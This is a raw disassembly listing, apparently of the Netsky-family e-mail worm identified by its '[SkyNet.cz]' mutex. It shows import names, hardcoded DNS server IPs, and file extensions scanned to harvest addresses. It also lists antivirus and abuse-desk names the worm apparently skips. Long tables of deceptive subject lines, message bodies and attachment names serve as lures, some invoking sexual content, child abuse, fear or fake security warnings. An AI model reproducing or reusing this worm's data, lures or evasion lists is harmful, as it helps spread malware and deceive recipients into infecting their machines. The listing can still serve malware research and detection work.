		dd 0, 46746547h, 53656C69h, 657A69h, 72430000h,	65746165h
		dd 656C6946h, 41h, 53746547h, 65747379h, 6D69546Dh, 65h
		dd 54746547h, 5A656D69h, 49656E6Fh, 726F666Eh, 6974616Dh
		dd 6E6Fh, 65470000h, 636F4C74h,	69546C61h, 656Dh, 6C5F0000h
		dd 64616572h, 0, 6C636C5Fh, 65736Fh, 6C5F0000h,	6E65706Fh
		dd 0, 4D746547h, 6C75646Fh, 6C694665h, 6D614E65h, 4165h
		dd 65470000h, 6E695774h, 73776F64h, 65726944h, 726F7463h
		dd 4179h, 736C0000h, 70637274h,	4179h, 6C5F0000h, 6565736Ch
		dd 6Bh,	646E6946h, 736F6C43h, 65h, 646E6946h, 7478654Eh
		dd 656C6946h, 41h, 646E6946h, 73726946h, 6C694674h, 4165h
		dd 65470000h, 69724474h, 79546576h, 416570h, 65530000h
		dd 72685474h, 50646165h, 726F6972h, 797469h, 65470000h
		dd 72754374h, 746E6572h, 65726854h, 6461h, 6F430000h, 69467970h
		dd 41656Ch, 6C530000h, 706565h,	65420000h, 7065h, 72430000h
		dd 65746165h, 65726854h, 6461h,	65470000h, 73614C74h, 72724574h
		dd 726Fh, 72430000h, 65746165h,	6574754Dh, 4178h, 65470000h
		dd 63695474h, 756F436Bh, 746Eh,	4 dup(0), 65746E49h, 74656E72h
		dd 43746547h, 656E6E6Fh, 64657463h, 74617453h, 65h, 6 dup(0)
		dd 4E746547h, 6F777465h, 61506B72h, 736D6172h, 4 dup(0)
		dd 65520000h, 6F6C4367h, 654B6573h, 79h, 44676552h, 74656C65h
		dd 6C615665h, 416575h, 65520000h, 65704F67h, 79654B6Eh
		dd 41h,	44676552h, 74656C65h, 79654B65h, 41h, 53676552h
		dd 61567465h, 4565756Ch, 4178h,	4 dup(0), 656C6544h, 69466574h
		dd 41656Ch, 65470000h, 646F4D74h, 48656C75h, 6C646E61h
		dd 4165h, 65470000h, 61745374h,	70757472h, 6F666E49h, 41h
		dd 43746547h, 616D6D6Fh, 694C646Eh, 41656Eh, 65470000h
		dd 72655674h, 6E6F6973h, 0, 74697845h, 636F7250h, 737365h
		dd 65480000h, 6C417061h, 636F6Ch, 65480000h, 72467061h
		dd 6565h, 65540000h, 6E696D72h,	50657461h, 65636F72h, 7373h
		dd 65470000h, 72754374h, 746E6572h, 636F7250h, 737365h
		dd 6E550000h, 646E6168h, 4564656Ch, 70656378h, 6E6F6974h
		dd 746C6946h, 7265h, 72460000h,	6E456565h, 6F726976h, 6E656D6Eh
		dd 72745374h, 73676E69h, 41h, 65657246h, 69766E45h, 6D6E6F72h
		dd 53746E65h, 6E697274h, 577367h, 69570000h, 68436564h
		dd 6F547261h, 746C754Dh, 74794269h, 65h, 45746547h, 7269766Eh
		dd 656D6E6Fh, 7453746Eh, 676E6972h, 73h, 45746547h, 7269766Eh
		dd 656D6E6Fh, 7453746Eh, 676E6972h, 5773h, 65530000h, 6E614874h
		dd 43656C64h, 746E756Fh, 0, 53746547h, 61486474h, 656C646Eh
		dd 0, 46746547h, 54656C69h, 657079h, 65480000h,	65447061h
		dd 6F727473h, 79h, 70616548h, 61657243h, 6574h,	69560000h
		dd 61757472h, 6572466Ch, 65h, 556C7452h, 6E69776Eh, 64h
		dd 74726956h, 416C6175h, 636F6C6Ch, 0, 70616548h, 6C416552h
		dd 636F6Ch, 754D0000h, 4269746Ch, 54657479h, 6469576Fh
		dd 61684365h, 72h, 53746547h, 6E697274h, 70795467h, 4165h
		dd 65470000h, 72745374h, 54676E69h, 57657079h, 0, 43746547h
		dd 666E4950h, 6Fh, 41746547h, 5043h, 65470000h,	4D454F74h
		dd 5043h, 65470000h, 6F725074h,	64644163h, 73736572h, 0
		dd 64616F4Ch, 7262694Ch, 41797261h, 0, 614D434Ch, 72745370h
		dd 41676E69h, 0, 614D434Ch, 72745370h, 57676E69h, 64h dup(0)
		dd 380h	dup(?)
B		ends

; Section 3. (virtual address 00008000)
; Virtual size			: 00011000 (  69632.)
; Section size in file		: 00003400 (  13312.)
; Offset to raw	data for section: 00006400
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
C		segment	para public 'CODE' use32
		assume cs:C
		;org 408000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
dword_408000	dd 0			; DATA XREF: __cinit+1Fo
dword_408004	dd 0			; DATA XREF: __cinit+1Ao
dword_408008	dd 0, 40570Fh		; DATA XREF: __cinit+10o
dword_408010	dd 0			; DATA XREF: __cinit:loc_403D0Do
dword_408014	dd 0			; DATA XREF: _doexit+65o
dword_408018	dd 0			; DATA XREF: _doexit:loc_403DB1o
dword_40801C	dd 0			; DATA XREF: _doexit+76o
dword_408020	dd 4 dup(0)		; DATA XREF: _doexit:loc_403DC2o
off_408030	dd offset a62_155_255_16 ; DATA	XREF: sub_40156C:loc_401627o
					; "62.155.255.16"
		dd offset a212_185_252_73 ; "212.185.252.73"
		dd offset a212_185_253_70 ; "212.185.253.70"
		dd offset a212_185_252_13 ; "212.185.252.136"
		dd offset a194_25_2_129	; "194.25.2.129"
		dd offset a194_25_2_130	; "194.25.2.130"
		dd offset a195_20_224_234 ; "195.20.224.234"
		dd offset a217_5_97_137	; "217.5.97.137"
		dd offset a194_25_2_129	; "194.25.2.129"
		dd offset a193_193_144_12 ; "193.193.144.12"
		dd offset a212_7_128_162 ; "212.7.128.162"
		dd offset a212_7_128_165 ; "212.7.128.165"
		dd offset a193_193_158_10 ; "193.193.158.10"
		dd offset a194_25_2_131	; "194.25.2.131"
		dd offset a194_25_2_132	; "194.25.2.132"
		dd offset a194_25_2_133	; "194.25.2.133"
		dd offset a194_25_2_134	; "194.25.2.134"
		dd offset a193_141_40_42 ; "193.141.40.42"
		dd offset a145_253_2_171 ; "145.253.2.171"
		dd offset a193_189_244_20 ; "193.189.244.205"
		dd offset a213_191_74_19 ; "213.191.74.19"
		dd offset a151_189_13_35 ; "151.189.13.35"
		dd offset a195_185_185_19 ; "195.185.185.195"
		dd offset a195_185_185_19 ; "195.185.185.195"
		dd offset a212_44_160_8	; "212.44.160.8"
aSkynet_czSyste	db '[SkyNet.cz]SystemsMutex',0 ; DATA XREF: sub_40156C+E7o
					; WinMain(x,x,x,x)+18o
; char *off_4080AC
off_4080AC	dd offset a__		; DATA XREF: sub_4028A4+3Er
					; sub_4028A4+5Fr
					; "._-\\/"
		dd offset a@		; "@"
		dd offset a__2		; ".[]-"
; char *off_4080B8
off_4080B8	dd offset a_eml		; DATA XREF: sub_4028A4+10Er
					; sub_402A51+40r
					; ".eml"
		dd offset a_txt		; ".txt"
		dd offset a_php		; ".php"
		dd offset a_pl		; ".pl"
		dd offset a_htm		; ".htm"
		dd offset a_html	; ".html"
		dd offset a_vbs		; ".vbs"
		dd offset a_rtf		; ".rtf"
		dd offset a_uin		; ".uin"
		dd offset a_asp		; ".asp"
		dd offset a_wab		; ".wab"
		dd offset a_doc		; ".doc"
		dd offset a_adb		; ".adb"
		dd offset a_tbb		; ".tbb"
		dd offset a_dbx		; ".dbx"
		dd offset a_sht		; ".sht"
		dd offset a_oft		; ".oft"
		dd offset a_msg		; ".msg"
		dd offset a_shtm	; ".shtm"
		dd offset a_cgi		; ".cgi"
		dd offset a_dhtm	; ".dhtm"
		dd offset a0123456789	; "0123456789"
		dd offset aBeAwareSkynet_ ; "be	aware! Skynet.cz - -->AntiHacker Cre"...
off_408114	dd offset aIcrosoft	; DATA XREF: sub_402821+7o
					; "icrosoft"
		dd offset aAntivi	; "antivi"
		dd offset aYmantec	; "ymantec"
		dd offset aSpam		; "spam"
		dd offset aAvp		; "avp"
		dd offset aFSecur	; "f-secur"
		dd offset aItdefender	; "itdefender"
		dd offset aOrman	; "orman"
		dd offset aCafee	; "cafee"
		dd offset aAspersky	; "aspersky"
		dd offset aFPro		; "f-pro"
		dd offset aOrton	; "orton"
		dd offset aFbi		; "fbi"
		dd offset aAbuse	; "abuse"
		dd offset aMessagelabs	; "messagelabs"
		dd offset aSkynet	; "skynet"
dword_408154	dd 40A56Ch		; DATA XREF: sub_401E62+15Dr
					; sub_402821+1Do
		dd offset aStatus	; "Status"
		dd offset aReport	; "report"
		dd offset aQuestion	; "question"
		dd offset aTrustMe	; "trust me"
		dd offset aHey		; "hey"
		dd offset aReExcuseMe	; "Re: excuse me"
		dd offset aReadItImmediat ; "read it immediatelly"
		dd offset aHi		; "hi"
		dd offset aReDoesIt?	; "Re: does it?"
		dd offset aYep		; "Yep"
		dd offset aImportant	; "important"
		dd offset aHello	; "hello"
		dd offset aDear		; "dear"
		dd offset aReUnknown	; "Re: unknown"
		dd offset aFake?	; "fake?"
		dd offset aWarning	; "warning"
		dd offset aMoin		; "moin"
		dd offset aWhatSUp?	; "what's up?"
		dd offset aInfo		; "info"
		dd offset aReInformation ; "Re:	information"
		dd offset aHereIsIt	; "Here	is it"
		dd offset aStolen	; "stolen"
		dd offset aPrivate?	; "private?"
		dd offset aGoodMorning	; "good	morning"
		dd offset aIllegal___	; "illegal..."
		dd offset aError	; "error"
		dd offset aTakeIt	; "take	it"
		dd offset aRe		; "re:"
		dd offset aReReReRe	; "Re: Re: Re: Re:"
		dd offset aYou?		; "you?"
		dd offset aSomethingForYo ; "something for you"
		dd offset aException	; "exception"
		dd offset aReHey	; "Re: hey"
		dd offset aExcuseMe	; "excuse me"
		dd offset aReHi		; "Re: hi"
		dd offset aReDoesIt?	; "Re: does it?"
		dd offset aReImportant	; "Re: important"
		dd offset aReHello	; "Re: hello"
		dd offset aBelieveMe	; "believe me"
		dd offset aQuestion_0	; "Question"
		dd offset aDenied	; "denied!"
		dd offset aNotification	; "notification"
		dd offset aRe5664ddff???z ; "Re: <5664ddff?$??§2>"
		dd offset aLol_0	; "lol"
		dd offset aLastChance	; "last	chance!"
		dd offset aIMBack	; "I'm back!"
		dd offset aItsMe	; "its me"
		dd offset aNotice	; "notice!"
		dd offset dword_417C1C
		dd offset aOh		; "oh"
		dd offset aAnnouncement	; "Announcement"
		dd offset aReThankYou	; "Re: Thank you"
		dd offset aReDetails	; "Re: Details"
		dd offset aThankYou	; "Thank you"
		dd offset aDetails	; "Details"
		dd offset aReApproved	; "Re: Approved"
		dd offset aApproved	; "Approved"
		dd offset aHiItSMe	; "hi, it's me"
		dd offset aThankYouVeryVe ; "Thank You very very much"
		dd offset aYouUseIllegal_ ; "You use illegal..."
		dd offset aYourIpWasLogge ; "Your IP was logged"
		dd offset aLoveIs	; "Love	is "
		dd offset aReCensored	; "Re: <censored>"
		dd offset aRegistered?	; "registered?"
		dd offset aYourRequestWas ; "Your request was registered"
		dd offset aReadNow	; "read	now!"
		dd offset aAttention	; "Attention"
		dd offset aSchedule	; "Schedule"
		dd offset aYouHave1DayLef ; "You have 1	day left"
		dd offset aReInformation ; "Re:	information"
		dd offset aAutomaticNotif ; "automatic notification"
		dd offset aExpiredAccount ; "Expired account "
		dd offset aAutomaticRespo ; "automatic responder"
		dd offset aReadThisMessag ; "Read this message"
		dd offset aPleaseRead	; "please read"
		dd offset aPleaseReply	; "please reply	"
		dd offset aRegistrationCo ; "Registration confirm"
		dd offset aConfirmation	; "Confirmation"
		dd offset aConfirmationRe ; "Confirmation Required"
		dd offset aReturnedMail	; "Returned Mail"
; char *off_408298
off_408298	dd offset aDeliverError	; DATA XREF: sub_401E62+149r
					; sub_401E62+751r
					; "<Deliver Error>"
		dd offset aMessageError	; "<Message Error>"
		dd offset aServerError	; "<Server Error>"
		dd offset aWhatMeansThat? ; "what means	that?"
		dd offset aHelpAttached	; "help	attached"
		dd offset a____0	; "<...>"
		dd offset aOk___	; "ok..."
		dd offset aAttachmentFrom ; "<Attachment from Poland>"
		dd offset aThatIsInterest ; "that is interesting..."
		dd offset aIWaitForYourCo ; "i wait for	your comment about it."
		dd offset aSuchAsYours?	; "such	as yours?"
		dd offset aReadTheDetails ; "read the details."
		dd offset aGonna?	; "gonna?"
		dd offset aHereIsTheDocum ; "here is the document."
		dd offset aLol		; "*lol*"
		dd offset aReadItImmedi_0 ; "read it immediately!"
		dd offset aIFoundThatAbou ; "i found that about	you!"
		dd offset aYourHeroInTheP ; "your hero in the picture?"
		dd offset aYours?	; "yours?"
		dd offset aHereIsIt_	; "here	is it."
		dd offset aIllegalSt_OfYo ; "illegal st. of you?"
		dd offset aIsThatTrue?	; "is that true?"
		dd offset aAccount?	; "account?"
		dd offset aIsThatYourName ; "is	that your name?"
		dd offset aPicture?	; "picture?"
		dd offset aMessage?	; "message?"
		dd offset aIsThatYourAcco ; "is	that your account?"
		dd offset aPwd?		; "pwd?"
		dd offset aIWaitForAnAnsw ; "I wait for	an answer!"
		dd offset aAbuse?	; "abuse?"
		dd offset aIsThatYours?	; "is that yours?"
		dd offset aYouAreABadWrit ; "you are a bad writer"
		dd offset aIDonTKnowYourD ; "I don't know your document!"
		dd offset aMailFailed	; "<Mail failed>"
		dd offset aIHaveYourPassw ; "I have your password!"
		dd offset aYouWonTheRk	; "you won the rk!"
		dd offset aSomethingAbout ; "something about you!"
		dd offset aClassroomTestO ; "classroom test of you?"
		dd offset aKillTheWriterO ; "kill the writer of	this document!"
		dd offset aOldPhotosAbout ; "old photos	about you?"
		dd offset aIHopeThatsNotT ; "i hope thats not true!"
		dd offset aYourNameIsWron ; "your name is wrong!"
		dd offset aDoesItMatch?	; "does	it match?"
		dd offset aIFoundThisDocu ; "i found this document about you."
		dd offset aTimeToFear?	; "time	to fear?"
		dd offset aReally?	; "really?"
		dd offset aDoYouKnowThis? ; "do	you know this????"
		dd offset aIKnowYourDocum ; "i know your document!"
		dd offset aDidYouSentItTo ; "did you sent it to	me?"
		dd offset aThisFileIsBad ; "this file is bad!"
		dd offset aWhyShouldI?	; "why should I?"
		dd offset aPages?	; "pages?"
		dd offset aHer_		; "her."
		dd offset aAnotherPicHave ; "another pic, have fun! ...	:->"
		dd offset aTestIt	; "test	it"
		dd offset aChildPorn?	; "child porn?"
		dd offset aGreetings	; "greetings"
		dd offset aXxx?		; "xxx ?"
		dd offset aStuffAboutYou? ; "stuff about you?"
		dd offset aYourDocumentIs ; "your document is not good"
		dd offset aSomethingIsGoi ; "something is going	wrong!"
		dd offset aYourPhotoIsPoo ; "your photo	is poor"
		dd offset aInformationAbo ; "information about you?"
		dd offset aTheInformation ; "the information is	wrong!"
		dd offset aDocAboutMe?	; "doc about me?"
		dd offset aKillHimOnThePi ; "kill him on the picture!"
		dd offset aFromTheChatter ; "from the chatter (my photo!)"
		dd offset aFromYourLover ; "from your lover ;-)"
		dd offset aLoveLetter?	; "love	letter?"
		dd offset aHereTheSerials ; "here, the serials"
		dd offset aAreYouATeacher ; "are you a teacherin the picture?"
		dd offset aHereTheIntrodu ; "here, the introduction"
		dd offset aIsThatCriminal ; "is	that criminal?"
		dd offset aHereTheCheats ; "here, the cheats"
		dd offset aILikeYourDoc	; "i like your doc!"
		dd offset aWhatDoYouThink ; "what do you think about it?"
		dd offset aThatSAFunnyTex ; "that's a funny text."
		dd offset aThatSNotTheTru ; "that's not the truth?"
		dd offset aDoYouHave?	; "do you have?"
		dd offset aInstructMeAbou ; "instruct me about this!"
		dd offset aILostThat	; "i lost that"
		dd offset aIAmSpeachlessA ; "i am speachless about your	document!"
		dd offset aIsThatTheReali ; "is	that the reality?"
		dd offset aReply	; "reply"
		dd offset aMsg		; "msg"
		dd offset aYourDesignIsNo ; "your design is not	good!"
		dd offset aImportant?	; "important?"
		dd offset aYourTanNumber? ; "your TAN number?"
		dd offset aTakeItEasy	; "take	it easy!"
		dd offset aWhy?		; "why?"
		dd offset aYouAreNakedInT ; "you are naked in this document!"
		dd offset aThatsWrong	; "thats wrong!"
		dd offset aYourIcqNumber? ; "your icq number?"
		dd offset aIAmDesperate	; "i am	desperate"
		dd offset aModifications? ; "modifications?"
		dd offset aYourPersonalRe ; "your personal record?"
		dd offset aYes_		; "yes."
		dd offset aMisc_AndSoOn_S ; "misc. and so on. see you!"
		dd offset aYourAttachment ; "your attachment? verify it."
		dd offset aYouEarnMoneySe ; "you earn money, see the attachment!"
		dd offset aIsThatYourAtta ; "is	that your attachment?"
		dd offset aIsThatYourWebs ; "is	that your website?"
		dd offset aYouFeelTheSame ; "you feel the same."
		dd offset aMeaningOfThat? ; "meaning of	that?"
		dd offset aPossible?	; "possible?"
		dd offset aYouHaveTriedTo ; "you have tried to steal!"
		dd offset aDidYouAskMeFor ; "did you ask me for	that?"
		dd offset aYouAreBad	; "you are bad"
		dd offset aYourJob?IFound ; "your job? (I found	that!)"
		dd offset aIsThatPossible ; "is	that possible?"
		dd offset aSomethingIsG_0 ; "something is going	..."
		dd offset aSomethingIsNot ; "something is not ok"
		dd offset aDidYouKnowFrom ; "did you know from this document?"
		dd offset aWrongCalculati ; "wrong calculation!	(see the attachment!"...
		dd offset aNever	; "never!"
		dd offset aPoorQuality	; "poor	quality!"
		dd offset aGoodWork	; "good	work!"
		dd offset aExcellent	; "excellent!"
		dd offset aGreat	; "great!"
		dd offset aIDonTThinkSo_ ; "i don't think so."
		dd offset aPrettyPicAbout ; "pretty pic	about you?"
		dd offset aDocs?	; "docs?"
		dd offset aSchoolfriend? ; "schoolfriend?"
		dd offset aWarningFromThe ; "<Warning from the Government>"
		dd offset a09580985869gj ; "<09580985869gj>"
		dd offset a?		; "<?}"
		dd offset aIWantMore___	; "i want more..."
		dd offset aHereIsTheNextO ; "here is the next one!"
		dd offset aAttachi	; "attachi#"
		dd offset aDidYouSeeHerAl ; "did you see her already?"
		dd offset aIsThatYourWife ; "is	that your wife?"
		dd offset aIsThatYourCred ; "is	that your creditcard?"
		dd offset aIsThatYourPhot ; "is	that your photo?"
		dd offset aDoYouThinkSo? ; "do you think so?"
		dd offset aDoYouHaveTheBu ; "do	you have the bug also?"
		dd offset aAlready?	; "already?"
		dd offset aForgotten?	; "forgotten?"
		dd offset aDrugs?___	; "drugs? ..."
		dd offset aDoesItMatter? ; "does it matter?"
		dd offset aIHaveReceivedT ; "i have received this."
		dd offset aBest?	; "best?"
		dd offset aTheTruth?	; "the truth?"
		dd offset aYourBody?	; "your	body?"
		dd offset aYourEyes?	; "your	eyes?"
		dd offset aYourFace?	; "your	face?"
		dd offset aFileIsSelfDecr ; "File is self-decryting."
		dd offset aFileIsDamaged_ ; "File is damaged."
		dd offset aFileIsBad_	; "File	is bad."
		dd offset aISawYouLastWee ; "i saw you last week!"
		dd offset aXxxService	; "xxx service"
		dd offset aYourAccountIsE ; "your account is expired!"
		dd offset aYouCannotHideY ; "you cannot	hide yourself! (see photo)"
		dd offset aCopyright?	; "copyright?"
		dd offset aWhatStill?	; "what	still?"
		dd offset aWho?		; "who?"
		dd offset aHow?		; "how?"
		dd offset aBadGateway	; "<bad	gateway>"
		dd offset aOnlyEncrypted ; "only encrypted!"
		dd offset aPersonalMessag ; "personal message!"
		dd offset aMyAdvice____	; "my advice...."
		dd offset aIVeFoundItAbou ; "i've found it about you"
		dd offset aFailure	; "<<<Failure>>>"
		dd offset aAttachedMsg	; "<Attached Msg>"
		dd offset aScannedByNorto ; "<scanned by norton	antivirus>"
		dd offset aGreatXxx	; "great xxx!"
		dd offset aManOrWomen?	; "man or women?"
		dd offset aChildOrAdult? ; "child or adult?"
		dd offset aHereIsYours	; "here	is yours!"
		dd offset aACrazyDocAbout ; "a crazy doc about you"
		dd offset aXxxAboutYou?	; "xxx about you?"
		dd offset aIDonTWantYourX ; "i don't want your xxx pics!"
		dd offset aFailedMessageA ; "<Failed message available>"
		dd offset aAutomailer	; "<Automailer>"
		dd offset aDoc?		; "doc?"
		dd offset aTrial?	; "trial?"
		dd offset aWhat?	; "what?"
		dd offset asc_409440	; ";-)"
		dd offset aINeedYou	; "i need you!"
		dd offset aCorrectIt	; "correct it!"
		dd offset aSeeThis	; "see this!"
		dd offset aItSASecret	; "it's a secret!"
		dd offset aThisIsNothingF ; "this is nothing for kids!"
		dd offset aItSSoSimilarAs ; "it's so similar as yours!"
		dd offset aIsThatYourCar? ; "is	that your car?"
		dd offset aDoNotGiveUp	; "do not give up!"
		dd offset aGreatJob	; "great job!"
		dd offset aHereIsThe454	; "here	is the $%%454$"
		dd offset aYouAreSexyInTh ; "you are sexy in this doc!"
		dd offset aIncest?	; "incest?"
		dd offset aLetIt	; "let it!"
		dd offset dword_417C1C
		dd offset aYouLookLikeAnA ; "you look like an ape!"
		dd offset aYouLookLikeAnR ; "you look like an rat?"
		dd offset aBeMad?	; "be mad?"
		dd offset aAreYouCranky? ; "are	you cranky?"
		dd offset aBobTheBuilder ; "bob	the builder"
		dd offset aDidYouKnowThat ; "did you know that?"
		dd offset aMoney?	; "money?"
		dd offset aIsThatYourCar? ; "is	that your car?"
		dd offset aIsThisInformat ; "is	this information about you?"
		dd offset aIsThatYourPriv ; "is	that your privacy?"
		dd offset aIsThatYourTan? ; "is	that your TAN?"
		dd offset aIsThatYourMess ; "is	that your message?"
		dd offset aIsThatYourCd? ; "is that your cd?"
		dd offset aIsThatYourFing ; "is	that your finger?"
		dd offset aYourAreNaked? ; "your are naked?"
		dd offset aIsThatYourPorn ; "is	that your porn pic?"
		dd offset aIsThatYourWork ; "is	that your work?"
		dd offset aIsThatYourFami ; "is	that your family?"
		dd offset aIsThatYourBeas ; "is	that your beast?"
		dd offset aIsThatYourAcco ; "is	that your account?"
		dd offset aIsThatYourSlip ; "is	that your slip?"
		dd offset aIsThatYourDoma ; "is	that your domain?"
		dd offset aAreYouTheNaked ; "are you the naked one?"
		dd offset aAreYouTheNak_0 ; "are you the naked person!"
		dd offset aAreYouTheOne? ; "are	you the	one?"
		dd offset aDoesItBelongTo ; "does it belong to you?"
		dd offset aDoYouHaveSexIn ; "do	you have sex in	the picture?"
		dd offset aYouHaveASexyBo ; "you have a	sexy body in the pic!"
		dd offset aYourLieIsGoing ; "your lie is going around the world!"
		dd offset aTransferComple ; "<Transfer complete>"
		dd offset aAntispamComple ; "<Antispam complete>"
		dd offset aLetsTalkAboutI ; "lets talk about it!"
		dd offset aDoYouKnowTheTh ; "do	you know the thief?"
		dd offset aAreYouAPhotogr ; "are you a photographer?"
		dd offset aYouHaveDoneAMi ; "you have done a mistake in	the document"...
		dd offset aItsPrivateFrom ; "its private from me"
		dd offset aDoNotShowThisA ; "do	not show this anyone!"
		dd offset aNewPatchIsAvai ; "new patch is available!"
		dd offset aThisIsAnAttach ; "this is an	attachment message!"
		dd offset aInYourMind?	; "in your mind?"
		dd offset aMicrosoft	; "Microsoft"
		dd offset aFastFood___	; "fast	food..."
		dd offset aYourBill_	; "Your	bill."
		dd offset aTryThisPatch	; "try this patch!"
		dd offset aDoYouHaveAnOrg ; "do	you have an orgasm in the picture?"
		dd offset aClickTheAttach ; "<Click the	attachment to decrypt>"
		dd offset aAttachmentSign ; "<Attachment Signature 34933920>"
		dd offset aTransactionFai ; "Transaction failed. Show the doc!"
		dd offset aIVeFoundYourBi ; "I 've found your bill!"
		dd offset aSeeYourName	; "see your name!"
		dd offset aYouAreInfected ; "You are infected. Read the	details!"
		dd offset aHereIsMyAdvice ; "here is my	advice."
		dd offset aHereIsMyPhoto ; "here is my photo!"
		dd offset aHereIsTheCenso ; "here is the <censored>"
		dd offset aFeelFreeToUseI ; "feel free to use it."
		dd offset aDoesItBelongTo ; "does it belong to you?"
		dd offset aLoginRequiredR ; "Login required! Read the attachment!"
		dd offset aYourDocument_0 ; "your document is silly!"
		dd offset aIsThePicAFake? ; "is	the pic	a fake?"
		dd offset aAntispamIsTurn ; "Antispam is turned	off. See file!"
		dd offset aAuthentificati ; "Authentification required.	Read the att"...
		dd offset aSolveTheProble ; "solve the problem!"
		dd offset aNull		; "<null>"
		dd offset aDoNotUseMyDocu ; "do	not use	my document!"
		align 8
		dd offset aDoNotOpenTheAt ; "do	not open the attachment!"
		dd offset aDoNotVisitTheP ; "do	not visit the pages on the list	I se"...
		dd offset aExplain	; "explain!"
		dd offset aTellMeMoreAbou ; "tell me more about	your document!"
		dd offset aYourProviderWi ; "Your provider will	be disabled!"
		dd offset aInstantPatches ; "Instant patches."
; char *off_4086B0
off_4086B0	dd offset aDocument	; DATA XREF: sub_401E62+350r
					; sub_401E62+391r
					; "document"
		dd offset aAssocial	; "associal"
		dd offset aMsg		; "msg"
		dd offset aYours	; "yours"
		dd offset aDoc		; "doc"
		dd offset aWife		; "wife"
		dd offset aTalk		; "talk"
		dd offset aMessage	; "message"
		dd offset aResponse	; "response"
		dd offset aCreditcard	; "creditcard"
		dd offset aDescription	; "description"
		dd offset aDetails_0	; "details"
		dd offset aAttachment	; "attachment"
		dd offset aPic		; "pic"
		dd offset aMe		; "me"
		dd offset aTrash	; "trash"
		dd offset aCard		; "card"
		dd offset aStuff	; "stuff"
		dd offset aPoster	; "poster"
		dd offset aPosting	; "posting"
		dd offset aPortmoney	; "portmoney"
		dd offset aTextfile	; "textfile"
		dd offset aMoonlight	; "moonlight"
		dd offset aConcert	; "concert"
		dd offset aSexy		; "sexy"
		dd offset aInformation	; "information"
		dd offset aNews		; "news"
		dd offset aNote		; "note"
		dd offset aNumber_phone	; "number_phone"
		dd offset aBill		; "bill"
		dd offset aMydate	; "mydate"
		dd offset aSwimmingpool	; "swimmingpool"
		dd offset aClass_photos	; "class_photos"
		dd offset aProduct	; "product"
		dd offset aOld_photos	; "old_photos"
		dd offset aTopseller	; "topseller"
		dd offset aPs		; "ps"
		dd offset aImportant	; "important"
		dd offset aShower	; "shower"
		dd offset aMyaunt	; "myaunt"
		dd offset aAboutyou	; "aboutyou"
		dd offset aYours	; "yours"
		dd offset aNomoney	; "nomoney"
		dd offset aBirth	; "birth"
		dd offset aFound	; "found"
		dd offset aDeath	; "death"
		dd offset aStory	; "story"
		dd offset aWorker	; "worker"
		dd offset aMails	; "mails"
		dd offset aLetter	; "letter"
		dd offset aMore		; "more"
		dd offset aWebsite	; "website"
		dd offset aRegards	; "regards"
		dd offset aRegid	; "regid"
		dd offset aFriend	; "friend"
		dd offset aUnfolds	; "unfolds"
		dd offset aJokes	; "jokes"
		dd offset aDoc_ang	; "doc_ang"
		dd offset aYour_stuff	; "your_stuff"
		dd offset aLocation	; "location"
		dd offset a454543403	; "454543403"
		dd offset aFinal	; "final"
		dd offset aSchock	; "schock"
		dd offset aRelease	; "release"
		dd offset aWebcam	; "webcam"
		dd offset aDinner	; "dinner"
		dd offset aIntimateStuff ; "intimate stuff"
		dd offset aSexual	; "sexual"
		dd offset aRanking	; "ranking"
		dd offset aObject	; "object"
		dd offset aSecrets	; "secrets"
		dd offset aMail2	; "mail2"
		dd offset aAttach2	; "attach2"
		dd offset aPart2	; "part2"
		dd offset aMsg2		; "msg2"
		dd offset aDisco	; "disco"
		dd offset aFreaky	; "freaky"
		dd offset aVisa		; "visa"
		dd offset aParty	; "party"
		dd offset aMaterial	; "material"
		dd offset aMisc		; "misc"
		dd offset aNothing	; "nothing"
		dd offset aTransfer	; "transfer"
		dd offset aAuction	; "auction"
		dd offset aWarez	; "warez"
		dd offset aUndefinied	; "undefinied"
		dd offset aViolence	; "violence"
		dd offset aUpdate	; "update"
		dd offset aMasturbation	; "masturbation"
		dd offset aInjection	; "injection"
		dd offset aNaked1	; "naked1"
		dd offset aNaked2	; "naked2"
		dd offset aTear		; "tear"
		dd offset aMusic	; "music"
		dd offset aPaypal	; "paypal"
		dd offset aId		; "id"
		dd offset aPrivacy	; "privacy"
		dd offset aWord_doc	; "word_doc"
		dd offset aImage	; "image"
		dd offset aIncest	; "incest"
; char *off_408840
off_408840	dd offset dword_408968	; DATA XREF: sub_401E62+43Er
					; sub_401E62+4F3r
		dd offset dword_408960
		dd offset dword_408958
		dd offset dword_408950
		dd offset dword_408948
		dd offset dword_408940
; char *off_408858
off_408858	dd offset a_txt		; DATA XREF: sub_401E62+41Er
					; sub_401E62+4D3r
					; ".txt"
		dd offset a_rtf		; ".rtf"
		dd offset a_doc		; ".doc"
		dd offset a_htm		; ".htm"
		dd offset dword_408938
		dd offset dword_408930
off_408870	dd offset dword_40892C	; DATA XREF: StartAddress+10o
		dd offset dword_408928
		dd offset dword_408924
		dd offset dword_408920
		dd offset dword_40891C
		dd offset dword_408918
		dd offset dword_408914
		dd offset dword_408910
		dd offset dword_40890C
		dd offset dword_408908
		dd offset dword_408904
		dd offset dword_408900
		dd offset dword_4088FC
		dd offset dword_4088F8
		dd offset dword_4088F4
		dd offset dword_4088F0
		dd offset dword_4088EC
		dd offset dword_4088E8
		dd offset dword_4088E4
		dd offset dword_4088E0
		dd offset dword_4088DC
		dd offset dword_4088D8
		dd offset dword_4088D4
		dd offset dword_4088D0
dword_4088D0	dd 3A7Ah		; DATA XREF: StartAddress+2Do
					; C:004088CCo
dword_4088D4	dd 3A79h		; DATA XREF: C:004088C8o
dword_4088D8	dd 3A78h		; DATA XREF: C:004088C4o
dword_4088DC	dd 3A77h		; DATA XREF: C:004088C0o
dword_4088E0	dd 3A76h		; DATA XREF: C:004088BCo
dword_4088E4	dd 3A75h		; DATA XREF: C:004088B8o
dword_4088E8	dd 3A74h		; DATA XREF: C:004088B4o
dword_4088EC	dd 3A73h		; DATA XREF: C:004088B0o
dword_4088F0	dd 3A72h		; DATA XREF: C:004088ACo
dword_4088F4	dd 3A71h		; DATA XREF: C:004088A8o
dword_4088F8	dd 3A70h		; DATA XREF: C:004088A4o
dword_4088FC	dd 3A6Fh		; DATA XREF: C:004088A0o
